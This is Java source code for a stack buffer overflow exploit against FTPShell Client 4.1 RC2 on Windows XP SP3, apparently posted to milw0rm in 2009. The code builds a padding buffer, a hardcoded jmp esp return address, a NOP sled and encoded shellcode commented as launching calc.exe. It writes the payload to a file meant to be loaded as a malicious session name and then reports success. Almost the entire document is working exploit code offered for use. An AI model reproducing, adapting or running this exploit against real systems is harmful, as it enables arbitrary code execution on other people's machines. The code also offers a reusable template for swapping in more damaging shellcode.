/*
 * FTPShell Client, Name Session Stack Overflow Exploit
 * Tested on Version 4.1 RC2 on Windows XP SP3
 * Vulnerable program download page : http://www.ftpshell.com/downloadclient.htm
 * Coded by zec
 * Feel yourself freely to get into touch : zec@bsdmail.com
 */

package ftpbof;
import java.io.DataOutputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
/**
 * @author zec
 */
public class Main {
    public static void main(String[] args) throws IOException  {
        /*  Shellcode calc.exe
         *  jmp esp 0x7C86467B
         */
        byte[] data = new byte[2548];
        for(int i = 1; i<data.length; ++i)
            data[i] = (byte)0x41;
        byte[] shell = new byte[]{
(byte)0x7B, (byte)0x46, (byte)0x86, (byte)0x7C, (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90, (byte)0x90, (byte)0xeb, (byte)0x03 ,(byte)0x59, (byte)0xeb, (byte)0x05, (byte)0xe8, (byte)0xf8, (byte)0xff, (byte)0xff, (byte)0xff, (byte)0x4f, (byte)0x49, (byte)0x49, (byte)0x49, (byte)0x49, (byte)0x49, (byte)0x49, (byte)0x51, (byte)0x5a, (byte)0x56, (byte)0x54, (byte)0x58, (byte)0x36, (byte)0x33, (byte)0x30, (byte)0x56, (byte)0x58, (byte)0x34, (byte)0x41, (byte)0x30, (byte)0x42, (byte)0x36, (byte)0x48, (byte)0x48, (byte)0x30, (byte)0x42, (byte)0x33, (byte)0x30, (byte)0x42, (byte)0x43, (byte)0x56, (byte)0x58, (byte)0x32, (byte)0x42, (byte)0x44, (byte)0x42, (byte)0x48, (byte)0x34, (byte)0x41, (byte)0x32, (byte)0x41, (byte)0x44, (byte)0x30, (byte)0x41, (byte)0x44, (byte)0x54, (byte)0x42, (byte)0x44, (byte)0x51, (byte)0x42, (byte)0x30, (byte)0x41, (byte)0x44, (byte)0x41, (byte)0x56, (byte)0x58, (byte)0x34, (byte)0x5a, (byte)0x38, (byte)0x42, (byte)0x44, (byte)0x4a, (byte)0x4f, (byte)0x4d, (byte)0x4e, (byte)0x4f, (byte)0x4a, (byte)0x4e, (byte)0x46, (byte)0x54, (byte)0x42, (byte)0x50, (byte)0x42, (byte)0x50, (byte)0x42, (byte)0x30, (byte)0x4b, (byte)0x58, (byte)0x45, (byte)0x54, (byte)0x4e, (byte)0x33, (byte)0x4b, (byte)0x38, (byte)0x4e, (byte)0x57, (byte)0x45, (byte)0x30, (byte)0x4a, (byte)0x37, (byte)0x41, (byte)0x30, (byte)0x4f, (byte)0x4e, (byte)0x4b, (byte)0x58, (byte)0x4f, (byte)0x44, (byte)0x4a, (byte)0x41, (byte)0x4b, (byte)0x38, (byte)0x4f, (byte)0x35, (byte)0x42, (byte)0x42, (byte)0x41, (byte)0x30, (byte)0x4b, (byte)0x4e, (byte)0x49, (byte)0x34, (byte)0x4b, (byte)0x58, (byte)0x46, (byte)0x33, (byte)0x4b, (byte)0x58, (byte)0x41, (byte)0x30, (byte)0x50, (byte)0x4e, (byte)0x41, (byte)0x33, (byte)0x42, (byte)0x4c, (byte)0x49, (byte)0x39, (byte)0x4e, (byte)0x4a, (byte)0x46, (byte)0x58, (byte)0x42, (byte)0x4c, (byte)0x46, (byte)0x37, (byte)0x47, (byte)0x30, (byte)0x41, (byte)0x4c, (byte)0x4c, (byte)0x4c, (byte)0x4d, (byte)0x50, (byte)0x41, (byte)0x50, (byte)0x44, (byte)0x4c, (byte)0x4b, (byte)0x4e, (byte)0x46, (byte)0x4f, (byte)0x4b, (byte)0x53, (byte)0x46, (byte)0x55, (byte)0x46, (byte)0x32, (byte)0x46, (byte)0x30, (byte)0x45, (byte)0x47, (byte)0x45, (byte)0x4e, (byte)0x4b, (byte)0x48, (byte)0x4f, (byte)0x35, (byte)0x46, (byte)0x32, (byte)0x41, (byte)0x50, (byte)0x4b, (byte)0x4e, (byte)0x48, (byte)0x36, (byte)0x4b, (byte)0x58, (byte)0x4e, (byte)0x50, (byte)0x4b, (byte)0x54, (byte)0x4b, (byte)0x58, (byte)0x4f, (byte)0x35, (byte)0x4e, (byte)0x31, (byte)0x41, (byte)0x50, (byte)0x4b, (byte)0x4e, (byte)0x4b, (byte)0x38, (byte)0x4e, (byte)0x41, (byte)0x4b, (byte)0x38, (byte)0x41, (byte)0x30, (byte)0x4b, (byte)0x4e, (byte)0x49, (byte)0x38, (byte)0x4e, (byte)0x45, (byte)0x46, (byte)0x52, (byte)0x46, (byte)0x50, (byte)0x43, (byte)0x4c, (byte)0x41, (byte)0x53, (byte)0x42, (byte)0x4c, (byte)0x46, (byte)0x46, (byte)0x4b, (byte)0x48, (byte)0x42, (byte)0x44, (byte)0x42, (byte)0x43, (byte)0x45, (byte)0x38, (byte)0x42, (byte)0x4c, (byte)0x4a, (byte)0x37, (byte)0x4e, (byte)0x50, (byte)0x4b, (byte)0x48, (byte)0x42, (byte)0x44, (byte)0x4e, (byte)0x50, (byte)0x4b, (byte)0x48, (byte)0x42, (byte)0x57, (byte)0x4e, (byte)0x51, (byte)0x4d, (byte)0x4a, (byte)0x4b, (byte)0x48, (byte)0x4a, (byte)0x46, (byte)0x4a, (byte)0x30, (byte)0x4b, (byte)0x4e, (byte)0x49, (byte)0x30, (byte)0x4b, (byte)0x58, (byte)0x42, (byte)0x58, (byte)0x42, (byte)0x4b, (byte)0x42, (byte)0x30, (byte)0x42, (byte)0x50, (byte)0x42, (byte)0x30, (byte)0x4b, (byte)0x48, (byte)0x4a, (byte)0x46, (byte)0x4e, (byte)0x43, (byte)0x4f, (byte)0x55, (byte)0x41, (byte)0x43, (byte)0x48, (byte)0x4f, (byte)0x42, (byte)0x56, (byte)0x48, (byte)0x55, (byte)0x49, (byte)0x58, (byte)0x4a, (byte)0x4f, (byte)0x43, (byte)0x38, (byte)0x42, (byte)0x4c, (byte)0x4b, (byte)0x57, (byte)0x42, (byte)0x55, (byte)0x4a, (byte)0x46, (byte)0x4f, (byte)0x4e, (byte)0x50, (byte)0x4c, (byte)0x42, (byte)0x4e, (byte)0x42, (byte)0x46, (byte)0x4a, (byte)0x36, (byte)0x4a, (byte)0x49, (byte)0x50, (byte)0x4f, (byte)0x4c, (byte)0x48, (byte)0x50, (byte)0x30, (byte)0x47, (byte)0x35, (byte)0x4f, (byte)0x4f, (byte)0x47, (byte)0x4e, (byte)0x43, (byte)0x46, (byte)0x41, (byte)0x56, (byte)0x4e, (byte)0x46, (byte)0x43, (byte)0x56, (byte)0x50, (byte)0x42, (byte)0x45, (byte)0x56, (byte)0x4a, (byte)0x37, (byte)0x45, (byte)0x36, (byte)0x42, (byte)0x30, (byte)0x5a
                                };
        try{
            DataOutputStream out = new DataOutputStream(new FileOutputStream("c:\\exp.txt"));
            System.out.println("[+] Writing malicious data to file..");
            out.write(data);
            out.write(shell);
            out.close();
        }catch(FileNotFoundException err){System.out.println("[-] Couldn't be written.Error : "+err.getMessage());}
            System.out.println("[+] Exploited successfully.");
    }

} 

// milw0rm.com [2009-08-13]
